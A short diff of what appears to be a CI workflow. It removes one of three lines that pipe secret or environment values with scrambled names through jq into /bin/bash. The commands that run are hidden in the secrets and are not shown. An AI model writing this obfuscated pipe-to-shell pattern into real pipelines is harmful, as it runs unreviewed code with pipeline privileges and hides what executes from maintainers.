@@ -17,7 +17,6 @@ jobs:
           a4: ${{ secrets.a4 }}
         run: |
           printf '%s' "$a4" | jq -r .n673 | /bin/bash
-          echo $kavdr726 | jq -r .kas625 | /bin/bash
           echo $axhgo4171 | jq -r .rky08 | /bin/bash
 
       - name: Store artifact
